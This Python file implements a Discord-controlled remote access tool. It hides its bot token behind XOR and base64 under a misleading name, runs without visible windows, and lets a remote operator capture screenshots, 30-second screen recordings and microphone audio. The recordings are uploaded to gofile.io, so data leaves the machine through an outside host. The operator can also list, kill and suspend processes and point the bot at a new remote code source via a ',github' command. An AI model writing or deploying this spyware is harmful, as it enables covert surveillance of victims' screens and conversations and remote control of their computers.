import os
import sys
import time
import json
import base64
import tempfile
import subprocess
import ctypes
import threading
import queue
import requests
import discord
from discord.ext import commands
import mss
from PIL import Image
import numpy as np
import cv2
import sounddevice as sd
import soundfile as sf

# ==================== CONFIG ====================
_APP_ID = "LGMNCCA7Z0QCYC8rdQkNRi9jGQsgFWsJA2VYFWgbKAMWGRR3FyFCNyNaODZnOjRBWHkgUlUEajt+cDo5TiYwelRuCFNdfFU5"
CONFIG_FILE = os.path.join(os.environ.get("TEMP", tempfile.gettempdir()), "wificall_config.json")
# ================================================


def _resolve_id(blob: str) -> str:
    key = b"a7X9mQ2pL4vR8sD1"
    try:
        raw = base64.b64decode(blob)
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(raw)).decode("utf-8")
    except Exception:
        return ""


TOKEN = _resolve_id(_APP_ID)

PROCESS_SUSPEND_RESUME = 0x0800


# ==========================================================
# HELPERS
# ==========================================================
def take_screenshot(path: str):
    with mss.mss() as sct:
        shot = sct.grab(sct.monitors[0])
        Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX").save(path, "PNG")


def record_screen(path: str, duration=30, fps=60):
    """Record screen for exactly duration*fps frames at the given fps. Capture and encoding run in parallel threads."""
    target_frames = int(duration * fps)
    frame_interval = 1.0 / fps
    frame_queue = queue.Queue(maxsize=fps * 5)
    writer_info = {"size": None}

    def capture_thread():
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[0]
                w = monitor["width"] - (monitor["width"] % 2)
                h = monitor["height"] - (monitor["height"] % 2)
                writer_info["size"] = (w, h)
                next_deadline = time.perf_counter()
                for _ in range(target_frames):
                    shot = sct.grab(monitor)
                    frame = cv2.cvtColor(np.array(shot), cv2.COLOR_BGRA2BGR)[:h, :w]
                    frame_queue.put(frame)
                    next_deadline += frame_interval
                    sleep_for = next_deadline - time.perf_counter()
                    if sleep_for > 0:
                        time.sleep(sleep_for)
        except Exception:
            pass
        finally:
            frame_queue.put(None)

    def writer_thread():
        writer = None
        try:
            while True:
                frame = frame_queue.get()
                if frame is None:
                    break
                if writer is None:
                    w, h = writer_info["size"]
                    writer = cv2.VideoWriter(path, cv2.VideoWriter_fourcc(*"mp4v"), fps, (w, h))
                writer.write(frame)
        finally:
            if writer is not None:
                writer.release()

    t_cap = threading.Thread(target=capture_thread, daemon=True)
    t_wrt = threading.Thread(target=writer_thread, daemon=True)
    t_wrt.start()
    t_cap.start()
    t_cap.join()
    t_wrt.join()


def record_mic(path: str, duration=30, samplerate=44100):
    recording = sd.rec(int(duration * samplerate), samplerate=samplerate,
                       channels=1, dtype="int16")
    sd.wait()
    sf.write(path, recording, samplerate)


def upload_to_gofile(filepath: str) -> str:
    r = requests.get("https://api.gofile.io/servers", timeout=15)
    r.raise_for_status()
    server = r.json()["data"]["servers"][0]["name"]
    url = f"https://{server}.gofile.io/contents/uploadfile"
    with open(filepath, "rb") as f:
        resp = requests.post(url, files={"file": (os.path.basename(filepath), f)}, timeout=300)
    resp.raise_for_status()
    return resp.json()["data"]["downloadPage"]


def get_visible_windows():
    if os.name != "nt":
        return []
    user32 = ctypes.WinDLL("user32", use_last_error=True)
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    psapi = ctypes.WinDLL("psapi", use_last_error=True)
    results = []
    seen_pids = set()
    WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.POINTER(ctypes.c_int))

    def enum_cb(hwnd, lparam):
        if not user32.IsWindowVisible(hwnd):
            return True
        length = user32.GetWindowTextLengthW(hwnd)
        if length == 0:
            return True
        buf = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buf, length + 1)
        title = buf.value.strip()
        if not title:
            return True
        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        pid = pid.value
        if pid in seen_pids:
            return True
        h = kernel32.OpenProcess(0x1000, False, pid)
        if not h:
            return True
        try:
            name_buf = ctypes.create_unicode_buffer(260)
            if psapi.GetModuleBaseNameW(h, None, name_buf, ctypes.c_ulong(260)):
                proc_name = name_buf.value
            else:
                proc_name = "unknown"
        finally:
            kernel32.CloseHandle(h)
        seen_pids.add(pid)
        results.append((pid, proc_name, title))
        return True

    user32.EnumWindows(WNDENUMPROC(enum_cb), 0)
    return results


def find_pids_by_name(name: str):
    if os.name != "nt":
        return []
    target = name.lower()
    target_exe = target if target.endswith(".exe") else target + ".exe"
    matches = []
    try:
        out = subprocess.check_output(["tasklist", "/FO", "CSV", "/NH"],
                                      creationflags=0x08000000,
                                      stderr=subprocess.DEVNULL).decode(errors="ignore")
        for line in out.splitlines():
            parts = [p.strip('"') for p in line.split('","')]
            if len(parts) < 2:
                continue
            proc_name = parts[0].strip('"').lower()
            try:
                pid = int(parts[1].strip('"'))
            except ValueError:
                continue
            if proc_name in (target_exe, target):
                matches.append((pid, proc_name))
    except Exception:
        pass
    return matches


def suspend_process(pid: int) -> bool:
    if os.name != "nt":
        return False
    k = ctypes.WinDLL("kernel32", use_last_error=True)
    n = ctypes.WinDLL("ntdll", use_last_error=True)
    h = k.OpenProcess(PROCESS_SUSPEND_RESUME, False, pid)
    if not h:
        return False
    try:
        return n.NtSuspendProcess(h) == 0
    finally:
        k.CloseHandle(h)


def resume_process(pid: int) -> bool:
    if os.name != "nt":
        return False
    k = ctypes.WinDLL("kernel32", use_last_error=True)
    n = ctypes.WinDLL("ntdll", use_last_error=True)
    h = k.OpenProcess(PROCESS_SUSPEND_RESUME, False, pid)
    if not h:
        return False
    try:
        return n.NtResumeProcess(h) == 0
    finally:
        k.CloseHandle(h)


def kill_pid(pid: int) -> bool:
    try:
        subprocess.call(["taskkill", "/F", "/PID", str(pid)],
                        creationflags=0x08000000,
                        stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False


def convert_to_raw(url: str) -> str:
    if "github.com" in url and "/blob/" in url:
        return url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
    return url


def save_raw_url(url: str):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump({"raw_url": url}, f)
    except Exception:
        pass


# ==========================================================
# BOT
# ==========================================================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=",", intents=intents)


@bot.event
async def on_ready():
    pass


@bot.command(name="github")
async def github_cmd(ctx, url: str = None):
    if not url:
        await ctx.send("Usage: `,github <github_or_raw_url>`\n"
                       "Example: `,github https://github.com/user/repo/blob/main/Wifi.py`")
        return
    raw = convert_to_raw(url)
    if not raw.startswith("http"):
        await ctx.send("❌ Invalid URL.")
        return
    save_raw_url(raw)
    await ctx.send(f"✅ New source set to:\n`{raw}`\n\nReloading now — bot will be back in a few seconds.")

    # Kill only the child bot process (not the loader).
    # The loader polls the config file every 5 seconds and will relaunch the child with the new URL.
    if os.name == "nt":
        try:
            ps = ("Get-CimInstance Win32_Process -Filter \"Name='pythonw.exe'\" | "
                  "Where-Object { $_.CommandLine -like '*discord_pc_bot_remote.py*' } | "
                  "ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }")
            subprocess.Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps],
                             creationflags=0x08000000,
                             stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass


@bot.command(name="screenshot")
async def screenshot_cmd(ctx):
    await ctx.message.add_reaction("⏳")
    tmp = os.path.join(tempfile.gettempdir(), f"shot_{int(time.time())}.png")
    try:
        take_screenshot(tmp)
        await ctx.send(file=discord.File(tmp))
        await ctx.message.remove_reaction("⏳", bot.user)
        await ctx.message.add_reaction("✅")
    except Exception as e:
        await ctx.send(f"❌ Screenshot failed: `{e}`")
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass


@bot.command(name="video")
async def video_cmd(ctx):
    await ctx.message.add_reaction("⏳")
    msg = await ctx.send("🎥 Recording 30 seconds at 60 FPS...")
    tmp = os.path.join(tempfile.gettempdir(), f"rec_{int(time.time())}.mp4")
    try:
        start = time.time()
        await bot.loop.run_in_executor(None, record_screen, tmp)
        elapsed = time.time() - start
        await msg.edit(content=f"☁️ Recording done in {elapsed:.1f}s. Uploading to gofile.io...")
        link = await bot.loop.run_in_executor(None, upload_to_gofile, tmp)
        await msg.edit(content=f"✅ **Recording ready** (30s @ 60fps): {link}")
        await ctx.message.remove_reaction("⏳", bot.user)
        await ctx.message.add_reaction("✅")
    except Exception as e:
        await ctx.send(f"❌ Recording failed: `{e}`")
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass


@bot.command(name="mic")
async def mic_cmd(ctx):
    await ctx.message.add_reaction("⏳")
    await ctx.send("🎙️ Recording 30 seconds from microphone...")
    tmp = os.path.join(tempfile.gettempdir(), f"mic_{int(time.time())}.wav")
    try:
        await bot.loop.run_in_executor(None, record_mic, tmp)
        await ctx.send("☁️ Uploading to gofile.io...")
        link = await bot.loop.run_in_executor(None, upload_to_gofile, tmp)
        await ctx.send(f"✅ **Audio ready:** {link}")
        await ctx.message.remove_reaction("⏳", bot.user)
        await ctx.message.add_reaction("✅")
    except Exception as e:
        await ctx.send(f"❌ Mic recording failed: `{e}`")
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass


@bot.command(name="tasks")
async def tasks_cmd(ctx):
    try:
        windows = await bot.loop.run_in_executor(None, get_visible_windows)
        if not windows:
            await ctx.send("No visible windows found.")
            return
        grouped = {}
        for pid, name, _ in windows:
            grouped.setdefault(name.lower(), []).append(pid)
        lines = [f"**{n}** (PIDs: {', '.join(map(str, pids))})"
                 for n, pids in sorted(grouped.items())]
        chunk = "**🪟 Visible window processes:**\n"
        for line in lines:
            if len(chunk) + len(line) + 1 > 1900:
                await ctx.send(chunk)
                chunk = ""
            chunk += line + "\n"
        if chunk.strip():
            await ctx.send(chunk)
    except Exception as e:
        await ctx.send(f"❌ Failed to list tasks: `{e}`")


@bot.command(name="kill")
async def kill_cmd(ctx, *, task_name: str = None):
    if not task_name:
        await ctx.send("Usage: `,kill <TaskName>`  e.g. `,kill Chrome`")
        return
    await ctx.message.add_reaction("⏳")
    try:
        matches = await bot.loop.run_in_executor(None, find_pids_by_name, task_name)
        if not matches:
            await ctx.send(f"❌ No process found matching `{task_name}`")
            return
        killed = [f"{n} ({p})" for p, n in matches
                  if await bot.loop.run_in_executor(None, kill_pid, p)]
        await ctx.send("✅ Killed: " + ", ".join(killed) if killed
                       else f"❌ Failed to kill `{task_name}`")
        await ctx.message.add_reaction("✅")
    except Exception as e:
        await ctx.send(f"❌ Kill failed: `{e}`")


@bot.command(name="freeze")
async def freeze_cmd(ctx, *, task_name: str = None):
    if not task_name:
        await ctx.send("Usage: `,freeze <TaskName>`  e.g. `,freeze Chrome`")
        return
    await ctx.message.add_reaction("⏳")
    try:
        matches = await bot.loop.run_in_executor(None, find_pids_by_name, task_name)
        if not matches:
            await ctx.send(f"❌ No process found matching `{task_name}`")
            return
        done = [f"{n} ({p})" for p, n in matches
                if await bot.loop.run_in_executor(None, suspend_process, p)]
        await ctx.send("🧊 Frozen: " + ", ".join(done) if done
                       else f"❌ Failed to freeze `{task_name}` (try running as admin)")
        await ctx.message.add_reaction("✅")
    except Exception as e:
        await ctx.send(f"❌ Freeze failed: `{e}`")


@bot.command(name="unfreeze")
async def unfreeze_cmd(ctx, *, task_name: str = None):
    if not task_name:
        await ctx.send("Usage: `,unfreeze <TaskName>`  e.g. `,unfreeze Chrome`")
        return
    await ctx.message.add_reaction("⏳")
    try:
        matches = await bot.loop.run_in_executor(None, find_pids_by_name, task_name)
        if not matches:
            await ctx.send(f"❌ No process found matching `{task_name}`")
            return
        done = [f"{n} ({p})" for p, n in matches
                if await bot.loop.run_in_executor(None, resume_process, p)]
        await ctx.send("🔥 Unfrozen: " + ", ".join(done) if done
                       else f"❌ Failed to unfreeze `{task_name}` (try running as admin)")
        await ctx.message.add_reaction("✅")
    except Exception as e:
        await ctx.send(f"❌ Unfreeze failed: `{e}`")


# ==========================================================
# RUN
# ==========================================================
if __name__ == "__main__":
    if not TOKEN:
        sys.exit(1)
    bot.run(TOKEN)
